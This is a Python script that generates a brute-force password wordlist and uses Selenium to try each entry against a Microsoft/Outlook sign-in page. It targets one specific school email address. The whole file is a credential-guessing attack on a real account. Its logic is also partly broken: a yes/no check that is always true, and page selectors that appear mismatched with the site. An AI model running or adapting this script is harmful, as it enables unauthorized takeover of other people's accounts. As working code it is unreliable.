from itertools import product
import string
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time
x = ""
#This checks to see if you already got a list to avoid making a whole new list which takes forever
print("Do you have list already? Y/N")
x = input();
if x == "N" or "n":
  #Grabs input to see how big the string or password has to be and limits the scopes
  min_len = int(input("Enter minimn length of password: "))
  max_len = int(input("Enter maxium length of password: "))
  counter = 0
  #This allows the character to be any number, capital letter, normal letter, and weird special character
  character = string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation
  
  file_open = open("Wordlist.txt",'w')
  #For loop that keeps going on forever until it does the maxium length of the password
  for i in range(min_len,max_len+1):
    #The actual things that writes the password and puts it into the word file\
    for j in product(character,repeat=i):
      word = "".join(j)
      file_open.write(word)
      file_open.write('\n')
      counter+=1
  print("Wordlist of {} passwords created".format(counter))
driver = webdriver.Chrome(executable_path="venv/lib/python3.10/site-packages/chromedriver_binary")
# Input the email website 
driver.get('https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=89141bdc-e41c-f4ab-d9bb-243ff8d08f0f&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=638201053764908602.8ea4a557-3822-4f3b-a983-79f4c595d035&state=DYs7FoAwCMCoPo-DxQKlHAc_XR29vgzJkpcCAGuyJIVSYJ1Ho4OUrYvT6NT28YSEqmGmhjL5xPDBaD7lUtebWEu-W32_qD8&sso_reload=true')
time.sleep(30)
email_field = driver.find_element(By.XPATH, '//*[@id="i0116"]')
# Input your email address and press Enter to proceed to the next page
email_field.send_keys('24khale@go.dsdmail.net')
next_buttonTwo = driver.find_element(By.XPATH, '//*[@id="idSIButton9"]')
next_buttonTwo.click()
# Define the path to your wordlist file
wordlist_path = 'Wordlist.txt'
# Open the wordlist file and try each password
time.sleep(30)
with open(wordlist_path, 'r') as f:
    for line in f:
        # Strip any newline characters from the word
        password = line.strip()
        # Find the password field and input the password
        password_field = driver.find_element(By.XPATH, '//*[@id="password"]/div[1]/div/div[1]/input')
        password_field.send_keys(password)
        # Click the "Next" button to log in
        next_button = driver.find_element(By.XPATH, "//button[@class='VfPpkd-LgbsSe']")
        next_button.click()
        # Check if login was successful
        if "Enter a password" not in driver.page_source:
            print("Correct password is:", password)
            break
        # Clear the password field and try the next password
        password_field.clear()
# Close the browser
driver.quit()
